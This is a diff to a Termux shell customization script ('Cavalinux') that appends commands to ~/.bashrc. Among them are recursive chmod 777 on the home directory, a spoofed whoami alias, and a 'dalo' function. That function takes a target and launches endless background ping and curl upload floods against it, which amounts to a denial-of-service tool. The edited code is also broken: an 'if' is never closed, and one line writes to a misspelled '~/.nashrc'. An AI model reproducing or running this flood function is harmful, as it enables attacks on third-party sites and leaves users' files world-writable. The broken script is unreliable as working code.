@@ -5,7 +5,7 @@ echo "chmod -R 777 /data/data/com.termux/files/home > /dev/null 2>&1" >> ~/.bash
 echo "chmod +x * > /dev/null 2>&1" >> ~/.bashrc
 echo "chmod -R 777 * > /dev/null 2>&1" >> ~/.bashrc
 echo "cd /data/data/com.termux/files/usr/libexec/termux" >> ~/.bashrc
-echo "> command-not-found && echo 'echo Cavalinux: Operation Or Command Not Found.' >> command-not-found" >> ~/.nashrc
+echo "> command-not-found && echo 'echo Cavalinux: Operation Or Command Not Found. See: docs-cavalinux.vacalopp.repl.co' >> command-not-found" >> ~/.nashrc
 echo "cd / && cd storage && cd emulated && cd 0 || cd " >> ~/.bashrc
 echo "alias whoami='echo cavalinux'" >> ~/.bashrc
 echo "alias showfiles='ls'" >> ~/.bashrc
@@ -120,6 +120,7 @@ fi
 ' >> ~/.bashrc
 echo '
 dalo(){
+if [ -f "wordlist.txt" ]; then
 echo "Insert your target. (DONT USE IN A DEVICE WITH LESS THAN 4GB RAM OR FOR CRIMES!)"
 read site
 while true; do
@@ -127,5 +128,7 @@ ping -c 1000000 $site &
 curl -k -L -T wordlist.txt $site &
 curl -k -L $site &
 done
+else 
+echo "Please download wordlist with setwordlist before using dalo."
 }
-'
+' >> ~/.bashrc
